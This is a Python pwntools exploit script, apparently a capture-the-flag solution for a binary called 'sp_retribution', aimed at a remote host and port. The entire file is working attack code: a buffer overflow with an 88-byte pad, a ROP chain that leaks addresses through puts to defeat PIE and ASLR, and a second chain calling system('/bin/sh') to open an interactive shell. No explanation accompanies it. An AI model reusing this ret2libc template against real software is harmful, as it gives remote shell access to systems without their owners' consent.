from pwn import *

p = remote("178.62.83.221",30898)
#p=process("./sp_retribution")
EXE = './sp_retribution'
exe = ELF(EXE)
libc = ELF('./glibc/libc.so.6')
#context.log_level = "debug"
p.recvuntil(b'>> ')
p.sendline(b'2')
p.sendline(b'aaaaaaa')
p.recvline()
p.recvline()

p.recvline()

p.recvline()

p.recvline()

leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
print("leak=",hex(leak))
base  = leak - 0xd70
pop_rdi = base+0xd33
offset = libc.symbols['puts']
payload = b'a' * 88
payload += p64(pop_rdi)
payload += p64(base+exe.got['puts'])
payload += p64(base+exe.plt['puts'])
payload += p64(base+exe.symbols['main'])

p.sendline(payload)
p.recvline()
p.recvline()
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
print(hex(leak))
libc.address = leak - offset
binsh        = next(libc.search(b'/bin/sh')) # Find /bin/sh address
system       = libc.symbols['system']
payload = b'a' * 88
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
payload += p64(0xdeadbeef)
p.sendline(b'2')
p.sendline(b'a')
p.sendafter(b'(y/n): ',payload)
p.interactive()
#print(u32(p.recvline()[:-1]))
